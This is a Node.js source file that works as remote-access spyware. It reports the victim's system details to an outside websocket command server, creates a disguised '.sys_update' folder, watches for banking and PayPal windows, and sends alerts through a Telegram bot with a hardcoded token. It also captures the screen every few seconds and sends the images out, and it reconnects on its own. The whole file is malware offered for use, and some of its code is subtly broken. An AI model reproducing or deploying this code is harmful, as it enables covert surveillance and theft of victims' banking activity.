const WebSocket = require('ws');
const { exec } = require('child_process');
const fs = require('fs');
const os = require('os');
const path = require('path');
const https = require('https');

// --- CONFIGURATION ---
const WS_URL = 'wss://server-eight-pi-39.vercel.app'; // Use wss:// for secure websockets
const TELEGRAM_TOKEN = '9054625238:AAG1uzL9kvH6XxHf1wb6Ga71ZVwheNkS54Y';
const TELEGRAM_CHAT_ID = '6172226452';

let myId = null;
let ws = null;

// Persistence Logic
const persistDir = path.join(os.tmpdir(), '.sys_update');
if (!fs.existsSync(persistDir)) {
    fs.mkdirSync(persistDir);
}

function initConnection() {
    ws = new WebSocket(WS_URL);

    ws.on('open', () => {
        myId = require('crypto').createHash('sha256').update(os.hostname()).digest('hex').substr(0, 8);
        
        console.log(`Connected with ID: ${myId}`);

        ws.send(JSON.stringify({
            type: 'info',
            id: myId,
            os: os.platform(),
            arch: os.arch(),
            user: os.userInfo().username,
            ip: getExternalIP()
        }));

        startMonitoring();
    });

    ws.on('message', (msg) => {
        try {
            const data = JSON.parse(msg);
            if (data.type === 'take_control') takeControl(true);
            else if (data.type === 'release_control') takeControl(false);
        } catch (e) {
            console.error("Error parsing message:", e);
        }
    });

    ws.on('close', () => {
        console.log('WebSocket closed. Reconnecting...');
        setTimeout(initConnection, 5000); // Reconnect after 5 seconds
    });
    
    ws.on('error', (err) => {
        console.error('WebSocket error:', err);
    });
}

function startMonitoring() {
    // Banking/Browser Sniffing
    setInterval(async () => {
        const title = await getCurrentWindowTitle();
        if (title.toLowerCase().includes('bank') || title.toLowerCase().includes('paypal')) {
            sendTelegram(`🏦 BANKING DETECTED: ${title}`);
            captureScreen();
        }
    }, 2000);

    // Continuous Screen Capture
    setInterval(() => {
        captureScreen();
    }, 5000);
}

function captureScreen() {
    if (!ws || ws.readyState !== WebSocket.OPEN) return;

    const imgPath = path.join(os.tmpdir(), 'screen.png');
    // Note: avfoundation is macOS specific. For Linux/Windows, use different flags.
    // This command assumes macOS environment on Vercel or similar Unix-like.
    exec(`ffmpeg -y -f avfoundation -framerate 1 -i "1" -frames:v 1 ${imgPath}`, (err) => {
        if (!err && fs.existsSync(imgPath)) {
            const img = fs.readFileSync(imgPath);
            ws.send({ type: 'screen_data', id: myId, data: img.toString('base64') });
        }
    });
}

async function getCurrentWindowTitle() {
    return new Promise((resolve) => {
        // Check OS to determine command
        const platform = os.platform();
        let cmd = '';
        
        if (platform === 'win32') {
            cmd = 'powershell -command "(Get-Process -Id (Get-Process -Id $PID).Parent.Id).MainWindowTitle"';
        } else if (platform === 'darwin') {
            cmd = 'osascript -e \'tell application "System Events" to get name of first item of (get every process whose frontmost is true)\'';
        } else {
            // Linux fallback (often returns empty without X11/Wayland setup)
            cmd = 'xdotool getwindowfocus getwindowname'; 
        }

        exec(cmd, (err, stdout) => {
            resolve(stdout.trim());
        });
    });
}

function sendTelegram(msg) {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}`;
    https.get(url, (res) => {}).on('error', (e) => {
        console.error("Telegram Error:", e.message);
    });
}

function getExternalIP() {
    const nets = os.networkInterfaces();
    for (const name of Object.keys(nets)) {
        for (const net of nets[name]) {
            // Skip internal (loopback) and non-IPv4 addresses
            if (net.family === 'IPv4' && !net.internal) {
                return net.address;
            }
        }
    }
    return 'unknown';
}

function takeControl(state) {
    // Logic to enable/disable mouse/keyboard simulation
    console.log(`Take Control: ${state}`);
}

// Export a simple handler for Vercel so it doesn't exit immediately
exports.handler = async (event, context) => {
    // Return a simple response to keep the instance warm
    return {
        statusCode: 200,
        body: JSON.stringify({ status: 'running', id: myId })
    };
};

// Start the connection immediately when the module loads
initConnection();

// Keep the process alive by preventing default exit behavior
setInterval(() => {}, 1000 * 60 * 60);
